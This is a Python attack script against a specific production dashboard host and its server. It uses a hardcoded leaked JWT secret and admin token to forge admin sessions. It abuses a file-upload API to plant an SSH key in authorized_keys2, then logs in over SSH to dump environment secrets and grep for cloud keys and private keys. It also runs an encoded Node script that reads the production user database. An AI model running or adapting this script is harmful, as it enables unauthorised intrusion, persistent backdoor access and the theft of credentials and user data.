#!/usr/bin/env python3
# i29220 round A: dashboard files-RPC *WRITE* local-fallback -> ssh key -> 122.51.1.87 host shell
import os, sys, json, time, base64, hmac, hashlib, subprocess, re
import urllib.parse as up

HOST = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
ADMIN_TOKEN = "6c73b13da5b9d09c642a3daa85be7d62d8025acfaebfdbe6"
AID = "agent-b8d7ca0b"
OWNER = "af0a2285-490f-11f1-ac43-525400595be1"
TARGET = "122.51.1.87"
KEY = "/tmp/ak29220"

def _b(s):
    if not isinstance(s, str):
        s = json.dumps(s, ensure_ascii=False, default=str)
    return base64.b64encode(s.encode("utf-8", "replace")).decode()

def R(k, v):
    print("R:%s:%s" % (k, _b(v)), flush=True)

def curl(args, timeout=60):
    try:
        r = subprocess.run(["curl", "-s", "-k", "-m", str(timeout)] + args,
                           capture_output=True, timeout=timeout + 25)
        return r.returncode, r.stdout, r.stderr
    except Exception as e:
        return -1, b"", repr(e).encode()

def call(path, method="GET", body=None, session=None, admin=False, timeout=30, maxlen=20000):
    url = "https://%s%s" % (HOST, path)
    args = ["--http2", "-A", UA, "-H", "Accept: application/json, text/plain, */*",
            "-w", "\n__CODE__%{http_code}"]
    if session: args += ["-H", "Cookie: session=" + session]
    if admin: args += ["-H", "Authorization: Bearer " + ADMIN_TOKEN]
    if body is not None:
        args += ["-X", method, "-H", "Content-Type: application/json", "--data-binary", json.dumps(body)]
    elif method != "GET":
        args += ["-X", method]
    args += [url]
    rc, out, err = curl(args, timeout=timeout)
    txt = out.decode("utf-8", "replace"); code = ""; i = txt.rfind("__CODE__")
    if i >= 0:
        code = txt[i + 8:].strip()[:3]; txt = txt[:i]
    return {"code": code, "body": txt[:maxlen]}

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def forge(user_id, customer="aro", role="admin"):
    now = int(time.time())
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    p = b64u(json.dumps({"userId": user_id, "email": "p@x", "customer": customer,
                         "role": role, "iat": now, "exp": now + 86400 * 7}, separators=(",", ":")))
    sig = b64u(hmac.new(JWT_SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest())
    return h + "." + p + "." + sig

def jl(s):
    try: return json.loads(s)
    except Exception: return None

def qp(p): return up.quote(p, safe="/")

def ssh(cmd, timeout=90):
    args = ["ssh", "-i", KEY,
            "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
            "-o", "BatchMode=yes", "-o", "IdentitiesOnly=yes",
            "-o", "ConnectTimeout=15", "-o", "LogLevel=ERROR",
            "ubuntu@" + TARGET, cmd]
    return curl(args, timeout=timeout)

# ---------- P0 health ----------
R("P0_health", call("/api/health", timeout=20))

# ---------- P1 capture original DTO of AID ----------
orig = {}
r = call("/api/admin/agents", admin=True, timeout=40, maxlen=400000)
j = jl(r["body"]) or {}
agents = j.get("agents", []) if isinstance(j, dict) else []
allssh = []
for a in agents:
    if a.get("id") == AID:
        orig = {"ip": a.get("ip"), "sshUser": a.get("sshUser"),
                "workspacePath": a.get("workspacePath"), "customer": a.get("customer"),
                "status": a.get("status"), "name": a.get("name")}
    allssh.append({"id": a.get("id"), "ip": a.get("ip"), "sshUser": a.get("sshUser"),
                   "customer": a.get("customer")})
R("P1_admin", {"code": r["code"], "n": len(agents), "target": orig,
               "ubuntu_agents": [x for x in allssh if x.get("sshUser") == "ubuntu"][:6]})
if not orig.get("ip"):
    R("P9_abort", "target agent not found in admin list")
    print("ABORT", flush=True); sys.exit(0)

# ---------- P2 PATCH host->127.0.0.1 + ssh_user->ubuntu ----------
pr = call("/api/admin/agents", method="PATCH", admin=True,
          body={"id": AID, "host": "127.0.0.1", "ssh_user": "ubuntu"}, timeout=25, maxlen=4000)
pj = jl(pr["body"]) or {}
R("P2_patch", {"code": pr["code"], "ip": pj.get("ip"), "sshUser": pj.get("sshUser"),
               "body": pr["body"][:300]})

# ---------- P3 list /home/ubuntu/.ssh (GET, needs membership) ----------
sess = forge(OWNER)
ls = call("/api/agents/%s/files?action=list&path=%s" % (AID, qp("/home/ubuntu/.ssh")),
          session=sess, timeout=30, maxlen=20000)
lj = jl(ls["body"]) or {}
ents = [{"n": e.get("name"), "t": e.get("type"), "s": e.get("size")} for e in (lj.get("entries") or [])]
R("P3_ssh_dir", {"code": ls["code"], "path": lj.get("path"), "entries": ents,
                 "body": "" if ents else ls["body"][:200]})

# ---------- P4 generate keypair ----------
try:
    subprocess.run(["ssh-keygen", "-t", "ed25519", "-N", "", "-f", KEY, "-q"], check=True, timeout=30)
except Exception as e:
    R("P4_keygen_err", repr(e))
    print("keygen failed", flush=True)
pub = ""
try:
    pub = open(KEY + ".pub").read().strip()
except Exception as e:
    R("P4_pub_err", repr(e))
R("P4_pub", pub)
open("/tmp/authorized_keys2", "w").write(pub + "\n")

# ---------- P5 upload write probe to /home/ubuntu ----------
def upload(path_param, localfile, fname, timeout=60):
    url = "https://%s/api/agents/%s/files/upload?path=%s" % (HOST, AID, qp(path_param))
    args = ["--http2", "-A", UA, "-H", "Cookie: session=" + sess,
            "-F", "files=@%s;filename=%s;type=text/plain" % (localfile, fname),
            "-w", "\n__CODE__%{http_code}", url]
    rc, out, err = curl(args, timeout=timeout)
    txt = out.decode("utf-8", "replace"); code = ""; i = txt.rfind("__CODE__")
    if i >= 0:
        code = txt[i + 8:].strip()[:3]; txt = txt[:i]
    return {"code": code, "body": txt[:1500]}

open("/tmp/lumii_poc_29220.txt", "w").write("i29220 write primitive proof %s\n" % int(time.time()))
R("P5_write_home", upload("/home/ubuntu", "/tmp/lumii_poc_29220.txt", "lumii_poc_29220.txt"))

# ---------- P6 write our pubkey to /home/ubuntu/.ssh/authorized_keys2 ----------
R("P6_write_authkeys2", upload("/home/ubuntu/.ssh", "/tmp/authorized_keys2", "authorized_keys2"))

# ---------- P7 restore agent (host + ssh_user) ----------
rr = call("/api/admin/agents", method="PATCH", admin=True,
          body={"id": AID, "host": orig.get("ip"), "ssh_user": orig.get("sshUser")},
          timeout=25, maxlen=4000)
rj = jl(rr["body"]) or {}
R("P7_restore", {"code": rr["code"], "ip": rj.get("ip"), "sshUser": rj.get("sshUser")})

# ---------- P8 SSH as ubuntu with our key ----------
rc, out, err = ssh("id; hostname; whoami; uname -a; echo SUDO:$(sudo -n true 2>&1 && echo ok || echo no)", timeout=40)
R("P8_ssh", {"rc": rc, "out": out.decode("utf-8", "replace")[:1500], "err": err.decode("utf-8", "replace")[:600]})
if b"uid=" not in out:
    R("P9_result", "NO_SHELL (write may have failed)")
    print("NO SHELL", flush=True)
    sys.exit(0)

# ---------- P10 env secrets from .env.dev ----------
cmd = ("set -a; . /opt/lumii-prod/.env.dev 2>/dev/null; set +a; "
       "env | grep -Ei 'JWT_SECRET|DATABASE_URL|AGENT_WS_TOKEN|TURN_PROOF|TURN_TICKET|SAAS|APP_GATEWAY|PUSH_SECRET|KB_RELAY|ZOOFI|CLOUDFLARE|CF_|AKID|LTAI|AKIA|SECRET|PASSWORD|_KEY|TOKEN' "
       "| sort | head -120")
rc, out, err = ssh(cmd, timeout=40)
R("P10_env", {"rc": rc, "out": out.decode("utf-8", "replace")[:6000]})

# ---------- P11 targeted key/zoofi grep on host (bounded) ----------
cmd = (
 "timeout 90 grep -rEaoi --exclude-dir=node_modules --exclude-dir=.git --exclude-dir=dist "
 "'0x[0-9a-f]{64}' /home/ubuntu /opt/lumii-prod 2>/dev/null | sort -u | head -200\n"
 "echo '-----ZOOFI_INDEX-----'\n"
 "timeout 60 grep -rIl --exclude-dir=node_modules --exclude-dir=.git --exclude-dir=dist -i 'zoofi-index\\|zoofi_index' /home/ubuntu /opt/lumii-prod 2>/dev/null | head -30\n"
 "echo '-----TARGET_MATCH-----'\n"
 "timeout 60 grep -rIli --exclude-dir=node_modules --exclude-dir=.git --exclude-dir=dist "
 "'c56f7063fd6d199ccc443dbbf4283be602d46343\\|fe18aa1efa652660f36ab84f122cd36108f903b6' /home/ubuntu /opt/lumii-prod 2>/dev/null | head -30\n"
 "echo '-----CF_TUNNEL-----'\n"
 "ls -la /home/ubuntu/.cloudflared /etc/cloudflared 2>/dev/null\n"
 "grep -rIl -i 'cloudflared\\|trycloudflare' /home/ubuntu/.cloudflared /etc/cloudflared 2>/dev/null | head\n"
)
rc, out, err = ssh(cmd, timeout=170)
R("P11_grep", {"rc": rc, "out": out.decode("utf-8", "replace")[:12000]})

# ---------- P12 quick PG probe via node (read-only) ----------
node_js = r"""
const fs=require('fs');
let url=(fs.readFileSync('/opt/lumii-prod/.env.dev','utf8').match(/^DATABASE_URL=(.+)$/m)||[])[1];
if(url)url=url.trim();
const {Client}=require('/opt/lumii-prod/node_modules/pg');
(async()=>{const c=new Client({connectionString:url});await c.connect();
 const q=async(s)=>{try{const r=await c.query(s);return r.rows;}catch(e){return {err:String(e.message).slice(0,120)};}};
 const out={};
 out.tables=(await q("select table_name from information_schema.tables where table_schema='public' order by 1")).map?.(x=>x.table_name);
 for(const t of ['users','admins','user_agents','agents','runtimes','projects','members','organizations']){
   out['n_'+t]=await q("select count(*)::int as n from "+t);
 }
 out.users_cols=await q("select column_name from information_schema.columns where table_name='users' order by ordinal_position");
 out.admins_cols=await q("select column_name from information_schema.columns where table_name='admins' order by ordinal_position");
 out.users_sample=await q("select * from users limit 8");
 await c.end();
 console.log(JSON.stringify(out).slice(0,12000));
})().catch(e=>console.log('ERR',String(e).slice(0,300)));
"""
b64 = base64.b64encode(node_js.encode()).decode()
cmd = "cd /opt/lumii-prod && echo %s | base64 -d > /tmp/pgprobe29220.cjs && timeout 60 node /tmp/pgprobe29220.cjs" % b64
rc, out, err = ssh(cmd, timeout=90)
R("P12_pg", {"rc": rc, "out": out.decode("utf-8", "replace")[:12000], "err": err.decode("utf-8", "replace")[:300]})

R("P99_done", "roundA complete")
print("DONE", flush=True)
